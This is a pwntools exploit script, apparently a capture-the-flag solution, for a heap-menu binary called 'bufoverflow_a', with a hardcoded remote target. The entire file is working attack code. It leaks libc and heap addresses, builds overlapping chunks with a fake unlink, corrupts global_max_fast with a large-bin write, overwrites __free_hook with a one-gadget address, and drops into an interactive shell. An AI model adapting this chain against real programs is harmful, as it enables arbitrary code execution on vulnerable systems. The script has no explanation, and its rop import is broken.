from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./bufoverflow_a"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 1

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x0000000000001081+0x555555554000\n b *0x00000000000011DE+0x555555554000')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def Alloc(size):
	sla('>> ','1')
	sla('Size: ',str(size))

def Delete(idx):
	sla('>> ','2')
	sla('Index: ',str(idx))

def Fill(content):
	sla('>> ','3')
	sla('Content: ',content)

def Show():
	sla('>> ','4')

def hack():
	raw_input()
	
	#step 1: leak libc information
	Alloc(0x100)	#0
	Alloc(0x80)		#1
	Delete(0)
	Alloc(0x100)	#0
	Show()
	top_addr = u64(rv(6).ljust(8,'\x00'))
	lg("top_addr",top_addr)
	libc.address = top_addr - 0x58 - 0x399B00
	lg("libc.address",libc.address)
	system_addr = libc.symbols['system']
	lg('system_addr',system_addr)

	#step 2: leak heap address
	Delete(1)
	Delete(0)

	Alloc(0x100)	#0
	Alloc(0x100)	#1
	Alloc(0x200)	#2
	Alloc(0x100)	#3

	Delete(0)
	Delete(2)
	Delete(3)

	Alloc(0x200)	#0
	Show()
	heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
	lg('heap_addr',heap_addr)

	Delete(0)
	Delete(1)

	#step 3: build overlap chunk
	Alloc(0x108)	#0
	Alloc(0x4f0)	#1
	Alloc(0x100)	#2

	Delete(0)
	Alloc(0x108)	#0

	fake_fd = heap_addr - 0x18 + 0x18
	fake_bk = heap_addr - 0x10 + 0x18

	payload = p64(0) + p64(0x101) + p64(fake_fd) + p64(fake_bk)
	payload = payload.ljust(0x100,'\x00')
	payload += p64(0x100)
	Fill(payload)

	Delete(1)

	Alloc(0xf0)		#1
	Alloc(0x4f0)	#3

	Delete(0)
	Alloc(0x100)	#0
	payload = p64(0) + p64(0x711)
	Fill(payload)

	Delete(3)
	Alloc(0x500)	#3

	Delete(1)
	Alloc(0x700)	#1

	global_max_fast = libc.address + 0x39B7D0
	lg('global_max_fast',global_max_fast)
	#method 1
	payload = 'a'*0xf0 + p64(0) + p64(0x501) + p64(0) + p64(global_max_fast-0x10) + p64(0) + p64(heap_addr)+'A'*(0x4f0-0x20)+p64(0x21)*8
	#method 2
	#payload = 'a'*0xf0 + p64(0) + p64(0x501) + p64(0) + p64(heap_addr) + p64(0) + p64(global_max_fast-0x20)+'A'*(0x4f0-0x20)+p64(0x21)*8
	Fill(payload)

	Alloc(0x510)	#4
	Alloc(0x510)	#5
	Delete(4)

	Delete(0)
	Alloc(0x100)
	Fill(p64(0)+p64(0x101))
	Delete(1)
	Delete(0)
	Alloc(0x100)
	Fill(p64(0)+p64(0x101)+p64(heap_addr+8))
	Alloc(0xf0)
	Delete(0)
	Alloc(0x100)
	Alloc(0xf0)

	free_hook = libc.symbols['__free_hook']
	Fill(p64(free_hook))

	magic = 0x4526a
	magic = 0x3f52a
	Fill(p64(libc.address+magic))
	Delete(0)


	p.interactive()
hack()